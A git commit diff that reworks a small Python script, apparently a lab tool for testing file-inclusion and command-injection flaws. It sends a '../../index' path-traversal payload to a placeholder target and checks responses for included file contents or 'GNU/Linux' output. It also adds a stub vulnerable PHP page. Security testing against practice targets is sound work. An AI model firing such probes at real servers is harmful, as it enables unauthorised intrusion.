3217b6d2b261540f25945b12a696dd759d560597
weeyou90 <weeyou90@gmail.com>
2018-04-07 06:39:53 +0800

    changed infrastructure of inject.php

--- payloads/inject.py
+++ payloads/inject.py
@@ -1,27 +1,40 @@
 import requests
 import ssci
 
-BASE_URL = "http://target.com"
+BASE_URL = "http://target.com/"
 
 def injectPayload(url, paramname, method, payload):
 	#finds index.php at base
 	parsedURL = BASE_URL + url	
-	
+	html = ""	
 	#if get
 	if method == "GET":
 		getURL = parsedURL + "?" + paramname+"="+payload
 		content = requests.get(getURL)
-		print getURL
-		print content.text
+		html =  content.text
 		#instead of printing, i want to return the payload if true!
 
 	#if post
 	elif method == "POST":
 		print("POST")
 
+	print checkSuccess(html)
+
+def checkSuccess(html):
+#server side injection:
+
+	#included index.php
+	indexPHP = requests.get(BASE_URL + "index.php")
+	if indexPHP.text in html:
+		return "SSCI"
+	#uname -a successful:
+	if "GNU/Linux" in html:
+		return "SSCI"
+
+	
 
 if __name__ == "__main__":
 	
-	url = "/serverside/rfi.php"
+	url = "/serverside/lfi1.php"
 	payload = "../../index.php"
-	injectPayload(url, "page", "GET", ssci.generateRFI())
+	injectPayload(url, "page", "GET", "../../index")
--- vulnerable/index.php
+++ vulnerable/index.php
@@ -1,1 +1,6 @@
+<html>
+
+<?php echo "Hello! " ?>
 This is index.php
+
+</html>
